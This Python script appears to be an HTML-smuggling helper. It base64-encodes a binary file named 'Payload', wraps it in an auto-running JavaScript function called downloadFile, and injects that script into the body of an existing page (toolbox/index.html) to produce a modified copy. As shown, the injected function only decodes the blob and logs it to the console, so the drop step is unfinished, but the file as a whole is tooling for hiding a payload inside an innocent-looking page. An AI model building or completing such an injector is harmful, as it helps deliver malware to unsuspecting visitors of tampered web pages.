import base64
from bs4 import BeautifulSoup

with open("./payload/Payload", "rb") as payload_file:
    binary_data = payload_file.read()
    encoded_data = base64.b64encode(binary_data).decode()

js_script = f"""

    function downloadFile() {{
        const encoded = "{encoded_data}"
        const decoded = window.atob(encoded)

        console.log(decoded)
    }}

    downloadFile()
"""

def main():
    with open("toolbox/index.html", "r", encoding="utf-8") as original_file:
        html_content = original_file.read()

    soup = BeautifulSoup(html_content, "html.parser")

    title = soup.title.string
    print(f"Title of the page: {title}")

    new_script = soup.new_tag("script")
    new_script.string = js_script
    soup.body.append(new_script)

    with open("modified_index.html", "w", encoding="utf-8") as new_file:
        new_file.write(str(soup.prettify()))

if __name__ == "__main__":
    main()
